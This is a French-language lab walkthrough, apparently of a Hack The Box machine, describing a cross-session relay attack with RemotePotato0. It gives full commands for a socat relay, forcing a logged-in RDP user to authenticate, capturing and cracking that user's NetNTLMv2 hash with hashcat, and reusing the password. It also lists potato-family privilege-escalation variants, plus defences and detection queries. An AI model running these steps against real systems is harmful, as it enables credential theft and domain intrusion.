# Cross-Session Relay Attack

#### <mark style="color:blue;">🎯 Principe de l'attaque</mark>

**Cross-Session Relay** exploite le fait qu'un utilisateur connecté en RDP/Console peut être forcé à s'authentifier vers un serveur malveillant, révélant son hash NetNTLMv2 qui peut être cracké.

```
┌─────────────────────────────────────────────┐
│  SCÉNARIO                                   │
├─────────────────────────────────────────────┤
│                                             │
│  Utilisateur mark.bbond connecté en RDP     │
│            (Session ID: 1)                  │
│                    │                        │
│  Attaquant (nous) en WinRM                  │
│            (Session ID: 0)                  │
│                    │                        │
│  1. On force mark.bbond à s'authentifier    │
│  2. Vers notre serveur malveillant          │
│  3. On capture son hash NetNTLMv2           │
│  4. On cracke le hash offline               │
│                    │                        │
│            Password récupéré! 🎯            │
└─────────────────────────────────────────────┘
```

#### <mark style="color:green;">📋 Prérequis</mark>

**Conditions nécessaires :**

* Un utilisateur connecté en session interactive (RDP/Console)
* Nous avons des credentials pour le domaine (même utilisateur basique)
* Le port 135 (RPC) est accessible

**Identifier les utilisateurs connectés :**

**Méthode 1: qwinsta (nécessite session interactive)**

```powershell
# Depuis un shell WinRM normal - ÉCHOUE
qwinsta
# No session exists for *

# Solution: Utiliser RunasCs avec logon type 9
.\RunasCs.exe whatever whatever qwinsta -l 9

# Output:
 SESSIONNAME       USERNAME                 ID  STATE   TYPE
>services                                    0  Disc
 console           mark.bbond                1  Active
                   ↑                         ↑
              Utilisateur               Session ID
```

**Méthode 2: Get-Process (WinRM)**

```powershell
# Chercher explorer.exe (indique session utilisateur)
Get-Process explorer

# Chercher winlogon (indique utilisateur connecté)
Get-Process winlogon | Where-Object {$_.SessionId -ne 0}
```

**Méthode 3: query user (CMD)**

```cmd
query user
```

#### <mark style="color:green;">🛠️ Outils nécessaires</mark>

**1. RemotePotato0.exe**

**Téléchargement :**

```bash
wget https://github.com/antonioCoco/RemotePotato0/releases/download/1.2/RemotePotato0.zip
unzip RemotePotato0.zip
```

**Fonctionnement :**

```
RemotePotato0 fait 3 choses:

1. Force l'utilisateur distant (Session 1) à s'authentifier
   └─> Via COM object + IStorage trigger

2. Redirige cette authentification vers notre port 135
   └─> Via RogueOxidResolver

3. Capture le hash NetNTLMv2
   └─> Écoute sur port 9997 (relay server)
```

**2. socat (redirection de port)**

**Installation :**

```bash
sudo apt install socat
```

**Rôle :**

```
Redirige le trafic:
Notre machine:135 → Machine cible:9999

Car RemotePotato0 écoute sur 9999 par défaut
```

#### 🎯 Exploitation étape par étape

**Étape 1: Setup du tunnel socat**

```bash
# Sur notre machine Kali
sudo socat -v \
    TCP-LISTEN:135,fork,reuseaddr \
    TCP:10.10.11.78:9999

# Explication:
# -v : Verbose (voir le trafic)
# TCP-LISTEN:135 : Écouter sur notre port 135
# fork : Créer un nouveau process par connexion
# reuseaddr : Réutiliser l'adresse immédiatement
# TCP:10.10.11.78:9999 : Rediriger vers la cible
```

**Alternative avec SSH tunnel :**

```bash
# Si socat n'est pas disponible
ssh -L 135:10.10.11.78:9999 user@jumphost
```

**Étape 2: Upload de RemotePotato0**

```powershell
# Depuis evil-winrm
upload /path/to/RemotePotato0.exe RemotePotato0.exe

# Vérifier
ls RemotePotato0.exe
```

**Étape 3: Lancer RemotePotato0**

```powershell
# Sur la machine cible (via WinRM)
.\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.2

# Options expliquées:
# -m 2 : Mode 2 = Rpc capture (hash) server + potato trigger
# -s 1 : Session ID de la victime (mark.bbond)
# -x 10.10.14.2 : Notre IP (où écoute socat sur port 135)

# Autres options utiles:
# -r 9999 : Port local pour RogueOxidResolver (défaut: 9999)
# -p 9997 : Port local pour RPC relay server (défaut: 9997)
```

**Output attendu :**

```
[*] Detected a Windows Server version not compatible with JuicyPotato
[*] RogueOxidResolver must be run remotely
[*] Starting the RPC server to capture credentials hash
[*] RPC relay server listening on port 9997 ...
[*] Spawning COM object in the session: 1
[*] Calling StandardGetInstanceFromIStorage with CLSID:{...}
[*] Starting RogueOxidResolver RPC Server listening on port 9999 ... 
[*] IStoragetrigger written: 102 bytes
[*] ServerAlive2 RPC Call
[*] ResolveOxid2 RPC call
[+] Received the relayed authentication on the RPC relay server on port 9997
[*] Connected to RPC Server 127.0.0.1 on port 9999
[+] User hash stolen!

NTLMv2 Client   : DC01
NTLMv2 Username : MIRAGE\mark.bbond
NTLMv2 Hash     : mark.bbond::MIRAGE:2128cb5a5acda3cc:01de5d8bb6c567a89156bf2dab460ed6:...
```

**Étape 4: Sauvegarder et cracker le hash**

```bash
# Sauvegarder le hash dans un fichier
echo "mark.bbond::MIRAGE:2128cb5a5acda3cc:01de5d8bb6c567a89156bf2dab460ed6:..." > mark.hash

# Cracker avec hashcat
hashcat -m 5600 mark.hash /usr/share/wordlists/rockyou.txt

# Output:
MARK.BBOND::MIRAGE:2128cb5a5acda3cc:...:1day@atime
                                        ↑
                                   Password!

# Validation
netexec smb DC01.mirage.htb \
    -u mark.bbond \
    -p '1day@atime' \
    -k
# [+] mirage.htb\mark.bbond:1day@atime
```

#### <mark style="color:blue;">🔍 Comprendre l'attaque en détail</mark>

**Flux complet**

```
1. RemotePotato0 sur la cible:
   ├─> Spawn un objet COM dans la session de mark.bbond
   └─> L'objet COM nécessite une authentification RPC

2. Windows (pour mark.bbond):
   ├─> Doit contacter un serveur RPC pour valider l'objet COM
   └─> RemotePotato0 lui dit: "Le serveur est sur 10.10.14.2:135"

3. Mark.bbond s'authentifie:
   ├─> Son système envoie ses credentials vers 10.10.14.2:135
   └─> Format: NetNTLMv2 hash

4. Socat (notre machine):
   ├─> Reçoit sur port 135
   └─> Redirige vers 10.10.11.78:9999

5. RemotePotato0 (port 9999):
   ├─> Reçoit l'authentification
   ├─> Capture le hash NetNTLMv2
   └─> L'affiche!

6. Nous:
   └─> Crackons le hash offline
```

**Pourquoi ça fonctionne ?**

**Raisons techniques :**

1. **COM/DCOM Authentication** : Les objets COM peuvent nécessiter une authentification réseau
2. **Session Isolation** : La session 1 (RDP) est isolée de la session 0 (Services)
3. **IStorage Trigger** : Technique documentée pour forcer une authentification
4. **NetNTLMv2** : Hash crackable offline (contrairement à Kerberos)

**CLSIDs utiles :**

```
{5167B42F-C111-47A1-ACC4-8EABE61B0B54} : IStorageTrigger
{00000000-0000-0000-C000-000000000046} : IUnknown
{D99E6E74-FC88-11D0-B498-00A0C90312F3} : INetFwPolicy2
```

#### 🔒 Défense

**Prévention :**

**1. Empêcher l'exploitation de COM**

```powershell
# Désactiver DCOM
Set-ItemProperty -Path 'HKLM:\SOFTWARE\Microsoft\Ole' `
    -Name 'EnableDCOM' -Value 'N'

# Redémarrer le service
Restart-Service -Name 'RpcSs' -Force
```

**2. Durcir les sessions RDP**

```powershell
# Bloquer les requêtes RPC cross-session
New-NetFirewallRule -DisplayName "Block RPC Cross Session" `
    -Direction Inbound `
    -Protocol TCP `
    -LocalPort 135 `
    -Action Block
```

**3. Limiter les sessions interactives**

```powershell
# Politique de groupe
Computer Configuration → Windows Settings → Security Settings
→ Local Policies → User Rights Assignment
→ "Allow log on through Remote Desktop Services"
└─> Limiter aux admins uniquement
```

**Détection :**

**Event IDs à monitorer :**

```powershell
# Event 4648 : Explicit credential usage
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4648
} | Where-Object {
    $_.Properties[5].Value -match 'NTLM'
}

# Event 4624 : Successful logon (Type 3 = Network)
Get-WinEvent -FilterHashtable @{
    LogName='Security'
    ID=4624
} | Where-Object {
    $_.Properties[8].Value -eq 3  # Logon Type
}

# Alerter sur authentifications anormales depuis des sessions non-système
```

**Indicateurs d'attaque :**

* Connexions RPC inhabituelles depuis des sessions utilisateurs
* Authentications NetNTLM au lieu de Kerberos
* Objets COM spawned dans des sessions RDP
* Connexions sortantes vers port 135 externe

#### 💡 Variantes de l'attaque

**1. RemotePotato0 classique (local privilege escalation)**

```powershell
# Mode 1: Seulement potato trigger
.\RemotePotato0.exe -m 1 -r 10.10.14.2
```

**2. Juicy Potato (Windows 10/Server 2016)**

```powershell
.\JuicyPotato.exe -t * -p cmd.exe -l 9999 -c {CLSID}
```

**3. PrintSpoofer (Windows 10/Server 2019+)**

```powershell
.\PrintSpoofer.exe -i -c cmd
```

#### <mark style="color:blue;">💡 Dans le contexte Mirage</mark>

```
Attaque complète sur mark.bbond:

1. Reconnaissance:
   ├─> qwinsta via RunasCs
   └─> mark.bbond en Session 1 (Console)

2. Setup:
   ├─> Kali: sudo socat TCP-LISTEN:135 TCP:10.10.11.78:9999
   └─> Upload RemotePotato0.exe sur la cible

3. Exploitation:
   .\RemotePotato0.exe -m 2 -s 1 -x 10.10.14.2
   └─> Hash capturé!

4. Cracking:
   hashcat -m 5600 mark.hash rockyou.txt
   └─> Password: 1day@atime

5. Validation:
   netexec smb DC01.mirage.htb -u mark.bbond -p '1day@atime' -k
   └─> [+] mirage.htb\mark.bbond:1day@atime

6. Pourquoi important?
   └─> mark.bbond a ForceChangePassword sur javier.mmarshall!
```

***
